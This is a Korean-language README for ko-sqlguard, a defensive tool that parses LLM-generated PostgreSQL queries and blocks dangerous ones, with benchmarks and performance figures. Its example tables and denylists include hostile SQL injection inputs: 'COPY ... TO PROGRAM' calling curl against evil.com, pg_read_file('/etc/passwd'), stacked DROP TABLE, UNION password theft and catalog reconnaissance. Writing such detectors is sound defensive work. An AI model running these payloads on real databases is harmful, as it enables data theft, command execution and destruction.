# ko-sqlguard

> LLM이 생성한 PostgreSQL 쿼리를 **실행하기 전에** sqlglot AST로 검사하는 결정론적 가드레일. 파싱만 하고 절대 실행하지 않는다(fail-closed).

---

## 무엇을 위한 도구인가

LLM이 SQL을 직접 짜는 시대(Text-to-SQL, 에이전트의 NL2SQL 도구)에는, 모델이 만든 쿼리를
**그대로 DB에 던지면** 데이터 유출·삭제·DoS로 이어질 수 있다. ko-sqlguard는 그 쿼리를
DB에 보내기 직전에 한 번 걸러내는 **마지막 정적 방어선**이다.

- 멀티스테이트먼트(`...; DROP TABLE`), 쓰기 위장 읽기(데이터 변경 CTE, `SELECT INTO`, 잠금 읽기)
- 위험 함수(`pg_sleep`, `pg_read_file`, `dblink`, `lo_*`, `pg_*` 시스템/복제/통계 계열)
- 시스템 카탈로그 정찰(`pg_authid`/`pg_shadow`/`information_schema.*` 등 자격증명·역할·스키마 유출)
- 민감 컬럼(`password`/`ssn`/`credit_card`/`주민등록번호` …)과 행 전체 직렬화(`to_jsonb(u)`)
- 테이블/컬럼 allowlist 위반, 무제한/과도한 결과(LIMIT 미지정·과다)

### 심층 방어(defense-in-depth)에서의 위치

ko-sqlguard는 LLM 서빙 파이프라인에서 **tool SQL 경로**를 담당한다:

```
사용자 입력 → [ko-prompt-guard] → [PII 마스킹(ko-pii)] → LLM → [ko-output-guard] → 응답
                                                          │
                                              tool 호출(SQL) → [ko-sqlguard] → DB
```

> 입력·출력 가드(prompt/PII/output)와 달리, ko-sqlguard는 **모델이 만든 SQL** 그 자체를
> 검사한다. 어디까지나 한 겹의 방어이며, **최소 권한 DB 역할**을 대체하지 않는다.

---

## 핵심 차별점

| 특징 | 내용 |
|---|---|
| **결정론(ML 없음)** | 룰·denylist·allowlist·AST 패턴 매칭만 사용. 같은 입력 → 항상 같은 판정. 모델 호출·네트워크·확률 없음 |
| **파싱만, 실행 안 함** | `sqlglot.parse(read="postgres")`로 AST를 만들고 그 위에서만 검사. `check()`는 DB·LLM·네트워크를 절대 건드리지 않음. 다이얼렉트는 `GuardPolicy(dialect=...)`로 설정(MySQL/MSSQL/SQLite); 기본은 postgres-first **fail-closed**(비-postgres 구문은 보통 오생성 SQL → BLOCK 이 올바른 방어, attack recall 보존). 다중 다이얼렉트 입력이 정상이면 `fallback_dialects=(...)`로 opt-in |
| **fail-closed** | 파싱 실패·빈 입력·미지원 구문·정체불명 노드는 전부 **BLOCK**. 안전을 증명 못 하면 막는다 |
| **raw 문자열 미신뢰** | 함수/테이블/컬럼을 정규화된 AST 노드 이름으로 매칭 → 주석/대소문자/공백(`DrOp/**/TABLE`)으로 우회 불가 |
| **한국어 민감정보 인지** | 민감 컬럼 denylist에 `주민`/`주민번호`/`주민등록번호` 등 한국어 키를 그대로 포함 |
| **스코프 인지** | sqlglot scope 리졸버로 CTE가 실테이블을 가리는 우회(`FROM secrets ... WITH secrets AS ...`)까지 차단 |

---

## 구현된 것

모든 검사는 `src/ko_sqlguard/`의 **순수 함수**(AST + policy → 위반 목록)다.

| 검사 / 진입점 | violation code | 무엇을 잡는가 |
|---|---|---|
| `guard.check()` (상단) | `empty` / `parse_error` | 빈 입력·파싱 실패·미실행 구문을 fail-closed BLOCK |
| `guard.check()` (상단) | `multi_statement` | 한 입력에 2개 이상 문장(스택드/피기백 쿼리) 차단 |
| `check_statement_type` | `statement_type` | 읽기 외 구문(INSERT/UPDATE/DELETE/DDL/MERGE/COPY/SET 등), 권한 없는 MERGE·`ON CONFLICT DO UPDATE` 에스컬레이션 |
| `check_statement_type` | `select_into` | `SELECT ... INTO`(읽기로 위장한 테이블 생성) |
| `check_statement_type` | `locking_read` | `FOR UPDATE`/`FOR SHARE`(행 잠금을 잡는 비순수 읽기), 괄호 래핑 우회 포함 |
| `check_functions` | `blocked_function` | 위험 서버사이드 함수 denylist + `pg_*` 접두 게이트(미열거 함수까지 fail-closed) + `::reg*` 캐스트(카탈로그 객체 조회) + **cross-dialect 파일/서버 접근**(MySQL `load_file`, MSSQL `OPENQUERY`/`OPENROWSET`/`OPENDATASOURCE`) |
| `check_catalog` | `system_catalog` | `pg_catalog.*`/`information_schema.*`, 자격증명·역할·설정 뷰, `pg_*` 접두 카탈로그/통계 정찰 + **cross-engine 카탈로그**(Oracle `v$`/`dual`/`all_tables`, MSSQL `sysobjects`, **MySQL `mysql.*`(자격증명 `mysql.user`)·`performance_schema.*`**) |
| `check_sensitive_columns` | `sensitive_column` | 민감 컬럼명(정확 일치, 한국어 포함), 행 전체 직렬화(`to_jsonb`/`row_to_json`/`*_agg`), json/jsonb 리터럴 키 추출(`data ->> 'password'`) |
| `check_tables` | `table_not_allowed` | allowlist 밖 테이블(스코프 인지 — CTE 그림자 우회 차단) |
| `check_columns` | `column_not_allowed` | 컬럼 allowlist 위반, 제약 테이블의 `*`/`t.*`, 별칭·파생테이블·USING 우회, 모호한 비한정 컬럼 |
| `check_require_where` | `missing_where` | WHERE 없는 UPDATE/DELETE(전 행 변경 방지) |
| `check_cartesian` | `cartesian` | 연결 끊긴 관계 그래프(부분 링크 우회 포함). CROSS JOIN도 연결성으로 판정 — `a CROSS JOIN b WHERE a.id=b.id`(제약된 곱)는 통과, 미제약 CROSS/comma 곱은 차단 |
| `check_tautology` | `tautology` | 상수-참 술어(`OR 1=1`, `id=id`, `x LIKE '%'`, null-complement OR 등) |
| `check_inference` | `inference_probe` | 블라인드 SQLi 오라클 — 비상관 스칼라 서브쿼리 vs 상수, 상수참 `EXISTS`, **문장 어디서든 상수-상수 비교**(`CASE WHEN 1=1`) |
| `apply_limit` (변환) | `limit_injected` / `limit_capped` | 무제한 읽기에 기본 LIMIT 주입, 과도/비리터럴 LIMIT을 max로 캡 |
| `explain_cost_guard` (Tier-2) | `cost_exceeded` / `rows_exceeded` / `explain_failed` | (옵션) `EXPLAIN`(절대 `ANALYZE` 아님) 플래너 추정 비용/행수 초과 차단 |

보조 모듈: `policy.py`(정책·denylist 정의), `result.py`(Verdict/Severity/Violation/GuardResult),
`checks/_ast.py`(식별자 정규화·스코프 해석), `semantic.py`(Tier-2 LLM 자문 Protocol seam — 핫패스 밖).

---

## 동작 방식

```
입력 SQL
  └─ 1) sqlglot.parse(read="postgres")  ── 실패 시 즉시 BLOCK (fail-closed)
  └─ 2) 단일 문장 확인 (2개 이상 → BLOCK)
  └─ 3) 식별자 정규화 사본 위에서 결정론적 검사 전부 적용
  └─ 4) 판정
```

판정 라벨은 `Verdict` enum — **PASS / TRANSFORM / BLOCK**:

| 라벨 | 의미 |
|---|---|
| `PASS` | 위반 없음. 원본 SQL 그대로 사용 가능 |
| `TRANSFORM` | LIMIT 주입/캡 등 안전하게 재작성됨. `result.sql`에 재작성본 |
| `BLOCK` | 차단. `result.sql is None`, `result.violations`에 사유 |

심각도(`Severity`: LOW/MEDIUM/HIGH/CRITICAL)가 `policy.min_block_severity` 미만인
block 위반은 자문(warn)으로 강등된다. `Guard.enforce()`는 BLOCK이면 `GuardBlocked` 예외를 던진다.

---

## 사용 예시

```python
from ko_sqlguard import Guard, GuardPolicy, GuardBlocked, Verdict

guard = Guard(
    GuardPolicy(
        allowed_tables={"orders": [], "customers": ["id", "name"]},  # [] = 전 컬럼 허용
        default_limit=500,
    )
)

# 1) 판정 확인
r = guard.check("SELECT * FROM orders")
print(r.verdict)        # Verdict.TRANSFORM
print(r.sql)            # 'SELECT * FROM orders LIMIT 500'

r = guard.check("SELECT email FROM customers")
print(r.verdict)        # Verdict.BLOCK  (email 은 컬럼 allowlist 밖)
print([v.code for v in r.violations])   # ['column_not_allowed']

# 2) 안전한 SQL 만 받아오기 (차단 시 예외)
try:
    safe_sql = guard.enforce("SELECT * FROM orders; DROP TABLE orders")
except GuardBlocked as e:
    print(e)            # SQL blocked: [multi_statement] ...

# 모듈 레벨 편의 함수도 동일
from ko_sqlguard import check
check("SELECT pg_sleep(10)").verdict is Verdict.BLOCK   # True
```

```python
# (옵션) Tier-2: EXPLAIN 기반 비용 가드 — check() 통과 후, DB 연결로만 호출
pol = GuardPolicy(cost_threshold=1_000_000)   # 플래너 추정 비용 상한
guard = Guard(pol)
# guard.check_cost(sql, connection)  # EXPLAIN(ANALYZE 아님)으로 추정, 초과 시 BLOCK
```

`examples/quickstart.py`로 전체 동작을 바로 실행해 볼 수 있다(`python examples/quickstart.py`).

---

## 검증

- 로컬 테스트: **712 passed, 5 skipped** (테스트 파일 15개, `pytest`)
- **적대적 입력 회귀 테스트 포함** — 위험 입력 코퍼스(`tests/fixtures/adversarial.sql`)의
  모든 페이로드가 BLOCK 되는지, 그리고 검사 중 **예외를 던지지 않고**(fail-closed, not fail-crash)
  정상 쿼리는 과탐 없이 통과하는지를 회귀로 고정한다.
- 다루는 회귀 계열: CTE 스코프 우회, 별칭/파생테이블 컬럼 우회, `pg_*` 함수/카탈로그 접두 게이트,
  `to_reg*()`·`::reg*` 카탈로그 조회, 행 전체 직렬화, json 리터럴 키 추출, tautology/cartesian 우회,
  **추론형(블라인드) SQLi 오라클**(비상관 서브쿼리 vs 상수·상수참 `EXISTS`·**CASE 내 상수-상수 비교
  `CASE WHEN 1=1`** — `test_adversarial_inference.py`),
  **identity/version/schema/txid 서버 핑거프린팅 차단**(`test_adversarial_recon_functions.py`) 등.

```bash
PYTHONPATH=src python -m pytest -q
```

> Tier-2 비용 가드의 통합 테스트는 실 PostgreSQL이 있을 때만(`KO_SQLGUARD_TEST_DSN`) 수행되고,
> 없으면 skip 된다.

### 경쟁군 대비 (vs 베이스라인, 동일 코퍼스)

공개 SQLi 코퍼스(zrmarine + Pegasus77, deduped 2,955 attack) + benign reads-only(gretelai +
b-mc2, 3,819)에서 동일 채점(`eval/bench_sql_baselines.py`). 베이스라인은 전부 한 축이 무너진다:

| method | dangerous-recall | benign-FPR |
|---|---:|---:|
| **ko-sqlguard** (AST 의미 분석) | **99.7%** | **0.29%** |
| keyword-regex blacklist | 66.3% | 47.2% |
| bare-sqlglot (statement-type만) | 90.0% | 3.4% |

regex 는 정상 `UNION`/주석/세미콜론을 무차별 차단(FPR 47%)하면서 recall 도 낮고, bare-sqlglot 은
`SELECT ... OR 1=1` 같은 SELECT 내 tautology 를 못 잡는다. ko-sqlguard 만 **dangerous-recall ×
benign-FPR frontier 양 축 동시 우위**.

---

## 성능 (측정값)

아래 수치는 본 저장소에서 **직접 실행해 측정**한 값이다(일반 x86-64 CPU, Python 3.12,
sqlglot 30.x). 추론 모델·네트워크가 없는 **순수 파서/AST 검사**라 호출당 비용이 1ms 미만이다.

| 항목 | 측정값 | 측정 방법 |
|---|---|---|
| **콜드 스타트**(첫 `check()` 1회) | 약 **0.6 ~ 1.3 s** (1회성) | sqlglot 파서/문법의 지연 컴파일 워밍업 — **첫 호출 1번만** 발생, 이후 0으로 상각 |
| **워밍업 후 지연** (중앙값) | **약 0.6 ms** | 대표 입력(짧은 정상 + 짧은 악성) 교대 2,000회, 워밍업 후 |
| 워밍업 후 지연 (p95) | **약 0.8 ms** | 동일 측정 |
| 입력별 중앙값 | 정상 **약 0.63 ms** / 악성 **약 0.48 ms** | 각 2,000회 (악성은 위반 발견 시 조기 반환이라 더 빠름) |
| **처리량**(단일 스레드, 워밍업 후) | **약 1,500 ~ 2,000 calls/sec** | 20,000회 배치 wall-clock (정상 ~1,490 / 악성 ~1,970) |
| **전체 테스트** | **712 passed, 5 skipped** | `PYTHONPATH=src python -m pytest` |

> 콜드 스타트는 sqlglot 문법의 1회성 지연 컴파일이며 **호출당 비용이 아니다** — 프로세스 기동 시
> 한 번 `guard.check("SELECT 1")`로 미리 데우면 이후 요청은 전부 워밍업 지연(<1ms)으로 처리된다.
> (콜드 스타트 폭은 측정 환경의 디스크/캐시 상태에 따라 흔들린다.)

### 견고성 (대용량·적대적 입력)

병리적/대용량 단일 입력에서도 **시간이 폭발하지 않고 유한하게 끝난다**(크래시 없음, fail-closed).
아래는 워밍업 후 1회 측정값:

| 입력 | 크기 | 시간 | 판정 |
|---|---|---|---|
| 거대한 `IN (...)` 목록 (8,000개 값) | ~39K자 | 약 **0.26 s** | `PASS` |
| 단일 행 100,000자 문자열 리터럴 | ~100K자 | 약 **2 ms** | `PASS` |
| 10,000개 컬럼 SELECT | ~59K자 | 약 **0.58 s** | `PASS` |
| **3,000-깊이 OR 체인**(`id=0 OR id=1 OR …`) | ~32K자 | 약 **2.9 s** | `PASS`(유한, 크래시 없음) |
| **3,000-깊이 AND 체인** | ~35K자 | 약 **1.2 s** | `PASS`(유한, 크래시 없음) |

> 깊은 OR/AND 체인은 상수 폴딩 재귀에 깊이 상한(`_MAX_CONST_DEPTH`)을 두고, 그 위로
> `check()`가 예기치 못한 `RecursionError`까지 **BLOCK으로 잡아내** 항상 fail-closed로 끝난다.
> 이 케이스는 `tests/test_robustness.py`에 회귀로 고정되어 있다.

---

## 동작 예시 (실제 판정)

아래 표의 **판정/근거는 모두 가드를 실제로 호출해 얻은 그대로의 출력**이다(기본 `Guard()` 정책,
`default_limit=1000`, 합성 데이터). 판정 라벨은 `Verdict`(PASS/TRANSFORM/BLOCK), 근거는
`violations[*].code` 그대로다.

### 🚫 잡히는 입력 (악성/위험)

| 입력 (SQL) | 판정 | 근거 (violation code) |
|---|---|---|
| `SELECT password FROM users WHERE id=1` | `BLOCK` | `sensitive_column` |
| `SELECT * FROM accounts WHERE 주민등록번호 IS NOT NULL` | `BLOCK` | `sensitive_column` (한국어 키) |
| `SELECT pg_read_file('/etc/passwd')` | `BLOCK` | `blocked_function` |
| `COPY users TO PROGRAM 'curl evil.com'` | `BLOCK` | `statement_type` |
| `SELECT * FROM pg_authid` | `BLOCK` | `system_catalog` |
| `SELECT * FROM information_schema.columns` | `BLOCK` | `system_catalog` |
| `SELECT * FROM orders WHERE 1=1` | `BLOCK` | `tautology` |
| `SELECT * FROM a, b, c` | `BLOCK` | `cartesian` |
| `DROP TABLE users` | `BLOCK` | `statement_type` |
| `SELECT name FROM users UNION SELECT password FROM admins` | `BLOCK` | `sensitive_column` (UNION 탈취) |
| `SELECT * FROM users; DROP TABLE users` | `BLOCK` | `multi_statement` |

### ✅ 통과/안전 (정상 · 과탐 아님)

악성 입력과 **어휘를 공유하지만**(password_, card_, pg_, UNION/JOIN 등) 위험하지 않은
정상 쿼리는 차단되지 않는다 — 낮은 오탐(false-positive)을 입증한다.

| 입력 (SQL) | 판정 | 근거 |
|---|---|---|
| `SELECT password_changed_at FROM users WHERE id=5 LIMIT 10` | `PASS` | (민감 컬럼명 정확 일치 아님 — `password_changed_at` ≠ `password`) |
| `SELECT id, card_type FROM payments WHERE user_id=7 LIMIT 10` | `PASS` | (`card_type` ≠ `card_number`) |
| `SELECT pg_size_pretty(pg_column_size(doc)) FROM files LIMIT 10` | `PASS` | (허용된 pg_* 포맷팅 헬퍼) |
| `SELECT o.id, c.name FROM orders o JOIN customers c ON c.id=o.customer_id LIMIT 100` | `PASS` | (정상 JOIN — cartesian 아님) |
| `SELECT region, COUNT(*) FROM orders GROUP BY region LIMIT 50` | `PASS` | (정상 집계) |
| `SELECT * FROM orders WHERE total > 100` | `TRANSFORM` | `limit_injected` → `… LIMIT 1000` (차단이 아니라 안전 재작성) |

> 마지막 행은 차단이 아니라 **무제한 읽기에 기본 LIMIT을 주입하는 안전 변환**이다 —
> `result.sql`에 재작성된 쿼리가 담겨 그대로 실행할 수 있다.

---

## 설치

```bash
pip install ko-sqlguard
# 또는 소스에서
pip install .
```

의존성(`pyproject.toml`):

| 패키지 | 용도 |
|---|---|
| `sqlglot>=25.0` | PostgreSQL SQL 파싱 + AST/스코프 분석(핵심) |
| `pydantic>=2.0` | `GuardPolicy`/`GuardResult`/`Violation` 모델 |

선택 extra: `[dev]`(pytest/ruff/mypy), `[demo]`(streamlit). Python **3.10+**.
DB 드라이버 의존성은 없다 — Tier-2 비용 가드는 호출자가 넘기는 DB-API 2.0 연결(psycopg 등)을 사용한다.

---

## 외부 검증 (제3자 데이터셋, 2026-06)

ko-sqlguard 는 한국어 특화가 아니라 **파싱 전용 글로벌 도구**라, 영어 외부 SQL 벤치마크가 **번역·보정 없이 그대로 유효**하다.

| 데이터셋 (라이선스) | 역할 | n | 결과 |
|---|---|---:|---|
| zrmarine/sql_injection | SQLi 공격 | 295 | 차단(recall) **100%** |
| Pegasus77/sqli (apache-2.0) | SQLi 공격 | 500 | 차단 **99.8%** |
| 합산 (중복 제거) | SQLi 공격 | 627 | 차단 **99.8%** (626/627) |
| gretelai/synthetic_text_to_sql (apache-2.0) | 정상 조회 | 600 | reads-only 오차단 **0.18%** (1/548) |
| b-mc2/sql-create-context (cc-by-4.0) | 정상 SELECT | 500 | 오차단 **0.60%** |
| xlangai/spider (cc-by-sa-4.0) | 정상 SELECT | 500 | 오차단 **0.60%** |

> gretelai 600건 중 51건은 write/DDL 로, read-only 가드가 마땅히 차단한다(50/51 차단=정상 동작). 따라서 과탐 지표는 **읽기 쿼리 548건 기준 1건(0.18%)**으로 본다.

→ **실제 SQL 인젝션 약 99.8% 차단**(zrmarine 100% · pegasus 99.8%), **정상 읽기 조회 오차단 1% 미만** → 합산 기준 **precision 99.8% / F1 1.00**(공격 627건 vs 정상 읽기 548건). 결정론 파서가 recall·precision 양쪽에서 강한 영역(언어무관 도구라 base-rate 왜곡도 작다).

**개선 (2026-06).** 외부 벤치마크에서 tautology 게이트를 빠져나가던 **추론형(블라인드) SQLi**를 분석해 전용 탐지기(`checks/inference.py`)를 추가했다 — 비상관 스칼라 서브쿼리 vs 상수(`(SELECT COUNT(*) …) > 1`), 상수참 `EXISTS`, HAVING/JOIN-ON 위치·RHS 표면변형(음수·산술·CAST·NULL·BETWEEN·IN)까지. 개별로는 정상 파싱돼 통과하던 boolean 오라클을 차단하면서, **상관·필터된 정상 분석 쿼리는 그대로 통과**(reads-only 오차단 회귀 없음). 그 결과 합산(중복제거 627건) 차단율이 **기존 공개본 94.3% → 99.8%**(626/627)로 올랐고(잔여 1건은 정규화 후 read-only SELECT로 환원되는 무해 payload), 회귀는 `tests/test_adversarial_inference.py`로 고정했다.

**개선 (2026-07).** 남은 미탐/오탐을 좁혔다: ⓐ **CASE-오라클** — `SELECT CASE WHEN 1=1 THEN … END`처럼 WHERE 술어 밖(projection·CASE·함수 인자)에 숨은 상수-상수 비교를 문장 전체 스캔으로 차단(비상관 서브쿼리 오라클과 동일한 블라인드 SQLi인데 predicate-root 순회를 벗어나 통과하던 계열), ⓑ **제약된 CROSS JOIN 완화** — `a CROSS JOIN b WHERE a.id=b.id`(inner join과 동일)를 무조건 차단 대신 연결성 그래프로 판정해 정상 통과(미제약 CROSS는 차단 유지), ⓒ **eval 정직화** — `external_sqli.py`의 read-only 판정을 파싱 기반으로 강화해 multi-statement/CTE-write를 benign-read 분모에서 제외. 그 결과 외부 코퍼스 **ATTACK recall 99.05→99.73%**(miss 28→8, 신규 오탐 0/3819), **benign-FPR 0.55→0.29%**. 회귀는 `tests/test_case_oracle_and_cross.py`.

---

## 알려진 한계 & 잔여 미탐 (red-team)

ko-sqlguard 는 **PostgreSQL 전용**(sqlglot) AST 파서로, 적대적 레드팀에서 **공격 63/63 차단(우회 0)** 으로 세 가드 중 가장 견고했다. 비차단 공격행은 silent PASS 가 아니라 **TRANSFORM(기본 LIMIT 주입)** 이라 강제된 read-only DB 역할에서 무해하다(defense-in-depth).

- **잔여 FP(1건)**: `FROM 테이블 t, generate_series(...)` 처럼 콤마 조인 + 집합반환함수를 쓰는 정상 분석 쿼리를 cartesian 으로 오차단할 수 있다 — `allowed_tables` allowlist 로 튜닝 가능.
- **범위 밖**: 비-PostgreSQL 방언 고유 구문은 파싱 실패 시 fail-closed BLOCK 으로 처리된다(미탐이 아니라 보수적 차단).

---

## 라이선스

MIT License — Copyright (c) 2026 modak000. 전문은 [LICENSE](./LICENSE) 참조.
